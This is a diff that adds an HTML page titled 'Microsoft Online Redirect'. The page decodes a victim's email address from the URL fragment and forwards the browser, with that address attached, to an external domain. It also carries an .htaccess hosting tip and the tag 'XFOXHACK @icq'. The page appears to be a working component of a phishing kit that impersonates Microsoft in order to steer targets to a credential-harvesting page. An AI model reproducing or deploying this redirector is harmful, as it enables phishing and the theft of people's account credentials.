@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Microsoft Online Redirect</title>
+</head>
+<body>
+    <script>
+/* Add this to .htaccess if you want to use multiple argument in pubil html folder. file named .htaccess or create it
+RewriteEngine On
+RewriteRule ^[^/]+/try/(.*)$ /try/$1 [L] */
+
+var redirect_url = "https://wlngi.global/M"; // Change this to the URL you want to redirect to
+var path = window.location.href;  // Get the part of the URL after the domain name
+var parts = path.split('#'); // Split the path by #
+// Check if there is a second part
+if (parts.length > 1) {
+// Get the email from the second part
+var email = parts[1];
+if (isBase64(email)) {
+email = atob(email);
+}
+// Redirect to the new URL with the email
+window.location.href = redirect_url + email;
+} else {
+// No email found, show an error message
+alert('Sorry! I cant find redirect for you');
+}
+
+function isBase64(str) {
+try {
+return btoa(atob(str)) == str;
+} catch (err) {
+return false;
+}
+}
+console.log("The path is: " + path);
+// XFOXHACK @icq
+</script>
+</body>
+</html>
